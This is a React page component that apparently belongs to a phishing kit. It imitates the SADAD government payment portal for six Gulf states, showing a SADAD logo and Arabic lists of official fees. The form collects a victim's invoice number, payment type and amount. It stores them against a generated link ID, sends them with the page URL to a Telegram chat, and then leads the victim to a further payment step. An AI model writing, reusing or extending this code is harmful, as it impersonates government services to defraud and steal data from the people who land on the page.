import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";

const governmentPaymentTypes = {
  SA: [
    "مدفوعات حكومية عامة",
    "مدفوعات الديوان الملكي",
    "مدفوعات التأمينات الاجتماعية",
    "رسوم الجوازات والهجرة",
    "رسوم مكتب العمل",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم نقل الكفالة",
    "رسوم تغيير المهنة",
    "رسوم وزارة التجارة",
    "رسوم وزارة الصحة",
    "رسوم وزارة التعليم",
    "رسوم البلديات",
    "رسوم هيئة الزكاة والضريبة",
    "رسوم الخدمات القضائية",
    "مدفوعات أخرى"
  ],
  AE: [
    "مدفوعات حكومية",
    "مدفوعات ديوان ملكي",
    "مدفوعات تأمينات اجتماعية",
    "مدفوعات الزراعة والبيئة",
    "مدفوعات الجوازات",
    "مدفوعات مخالفات مكتب العمل",
    "رسوم مركبات",
    "رسوم نقل كفالة",
    "رسوم تغيير مهنة",
    "دفع رسوم تأييد رعاة",
    "رسوم تمكين",
    "مدفوعات مخالفات مرورية",
    "استرداد اموال",
    "مدفوعات أخرى"
  ],
  KW: [
    "مدفوعات حكومية عامة",
    "رسوم الإقامة والجنسية",
    "رسوم الجوازات",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة التجارة",
    "رسوم الهيئة العامة للقوى العاملة",
    "رسوم البلديات",
    "رسوم وزارة الصحة",
    "رسوم وزارة التربية",
    "رسوم المحاكم",
    "رسوم الخدمات الإلكترونية",
    "مدفوعات أخرى"
  ],
  BH: [
    "مدفوعات حكومية",
    "رسوم هيئة تنظيم سوق العمل",
    "رسوم الجوازات والجنسية",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة الصناعة والتجارة",
    "رسوم البلديات",
    "رسوم وزارة الصحة",
    "رسوم وزارة التربية والتعليم",
    "رسوم الخدمات القضائية",
    "رسوم الخدمات الإلكترونية",
    "مدفوعات أخرى"
  ],
  OM: [
    "مدفوعات حكومية عامة",
    "رسوم شرطة عمان السلطانية",
    "رسوم الإقامة",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة التجارة والصناعة",
    "رسوم وزارة القوى العاملة",
    "رسوم البلديات",
    "رسوم وزارة الصحة",
    "رسوم وزارة التربية والتعليم",
    "رسوم الخدمات القضائية",
    "مدفوعات أخرى"
  ],
  QA: [
    "مدفوعات حكومية",
    "رسوم وزارة الداخلية",
    "رسوم الإقامة والجوازات",
    "مخالفات المرور",
    "رسوم المركبات",
    "رسوم وزارة التجارة والصناعة",
    "رسوم وزارة العمل",
    "رسوم البلديات",
    "رسوم هيئة المنطقة الحرة",
    "رسوم وزارة الصحة العامة",
    "رسوم وزارة التعليم والتعليم العالي",
    "مدفوعات أخرى"
  ]
};

const countryLogos = {
  SA: "/sadad-logo.jpg",
  AE: "/sadad-logo.jpg",
  KW: "/sadad-logo.jpg",
  BH: "/sadad-logo.jpg",
  OM: "/sadad-logo.jpg",
  QA: "/sadad-logo.jpg",
};

const countryCurrencyNames = {
  SA: "ريال سعودي",
  AE: "درهم إماراتي",
  KW: "دينار كويتي",
  BH: "دينار بحريني",
  OM: "ريال عماني",
  QA: "ريال قطري",
};

const GovernmentPayment = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [paymentType, setPaymentType] = useState("");
  const [amount, setAmount] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const paymentTypes = governmentPaymentTypes[countryCode] || governmentPaymentTypes.SA;
  const currencyName = countryCurrencyNames[countryCode] || "ريال سعودي";
  const logoUrl = countryLogos[countryCode] || "/sadad-logo.jpg";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const updatedData = {
        ...linkData?.payload,
        government_payment: {
          invoice_number: invoiceNumber,
          payment_type: paymentType,
          amount: parseFloat(amount),
          country: countryCode
        },
        payment_amount: parseFloat(amount),
        recipient: {
          service: paymentType,
          amount: amount,
          invoice: invoiceNumber
        }
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: `حكومة - ${paymentType}`,
          invoice: invoiceNumber,
          amount: `${amount} ${countryData?.currency || 'SAR'}`,
          country: countryData?.nameAr,
          payment_url: window.location.href
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/recipient`);
    } catch (error) {
      toast({
        title: "خطأ في معالجة الطلب",
        description: "حدث خطأ أثناء معالجة طلب الدفع. يرجى المحاولة مرة أخرى.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: 'Arial', sans-serif;
        }

        .gov-payment-body {
          background: #ffffff;
          min-height: 100vh;
        }

        .gov-header {
          background: #ffffff;
          padding: 12px 20px;
          box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
        }

        .gov-logo {
          height: 60px;
          object-fit: contain;
        }

        .gov-container {
          max-width: 800px;
          margin: 20px auto;
          padding: 0 15px;
        }

        .gov-nav-bar {
          color: #158311;
          padding: 12px;
          margin-bottom: 15px;
          font-size: 14px;
        }

        .gov-main-section {
          background: #ffffff;
          padding: 20px;
          border-radius: 12px;
          box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
        }

        .gov-title {
          color: #158311;
          font-size: 20px;
          margin-bottom: 15px;
          font-weight: bold;
        }

        .gov-input-group {
          margin-bottom: 20px;
        }

        .gov-label {
          display: block;
          color: #5c5c5c;
          font-size: 14px;
          margin-bottom: 8px;
        }

        .gov-input, .gov-select {
          width: 100%;
          padding: 12px;
          border: 1px solid #158311;
          border-radius: 6px;
          background: #fff4ec;
          font-size: 14px;
          direction: rtl;
        }

        .gov-select {
          cursor: pointer;
          appearance: none;
          background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23158311' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
          background-repeat: no-repeat;
          background-position: left 12px center;
          padding-left: 30px;
        }

        .gov-button {
          background: #158311;
          color: white;
          padding: 12px 35px;
          border-radius: 6px;
          font-size: 14px;
          border: none;
          cursor: pointer;
          width: 100%;
          transition: 0.2s;
        }

        .gov-button:hover {
          background: #126d0e;
          transform: translateY(-1px);
          box-shadow: 0 4px 8px rgba(21, 131, 17, 0.3);
        }

        .gov-button:disabled {
          background: #8bc88a;
          cursor: not-allowed;
        }
      `}</style>

      <div className="gov-payment-body" dir="rtl">
        <header className="gov-header">
          <img 
            src={logoUrl} 
            alt="شعار سداد" 
            className="gov-logo"
          />
        </header>

        <div className="gov-container">
          <div className="gov-nav-bar">
            <span>الرئيسية / شخصي</span>
          </div>

          <div className="gov-main-section">
            <form onSubmit={handleSubmit}>
              <h1 className="gov-title">إتمام عملية السداد</h1>
              
              <div className="gov-input-group">
                <label className="gov-label">أدخل رقم الفاتورة</label>
                <input
                  type="text"
                  name="invoiceNumber"
                  value={invoiceNumber}
                  onChange={(e) => setInvoiceNumber(e.target.value)}
                  className="gov-input"
                  required
                />
              </div>

              <div className="gov-input-group">
                <label className="gov-label">اختر نوع السداد</label>
                <select
                  name="paymentType"
                  value={paymentType}
                  onChange={(e) => setPaymentType(e.target.value)}
                  className="gov-select"
                  required
                >
                  <option value="">اختر نوع السداد</option>
                  {paymentTypes.map((type) => (
                    <option key={type} value={type}>
                      {type}
                    </option>
                  ))}
                </select>
              </div>

              <div className="gov-input-group">
                <label className="gov-label">قيمة رسوم السداد ({currencyName})</label>
                <input
                  type="number"
                  name="amount"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="gov-input"
                  step="0.01"
                  min="1"
                  required
                />
              </div>

              <button 
                type="submit" 
                className="gov-button"
                disabled={isSubmitting || !invoiceNumber || !paymentType || !amount}
              >
                {isSubmitting ? "جاري المعالجة..." : "المتابعة والإكمال"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </>
  );
};

export default GovernmentPayment;
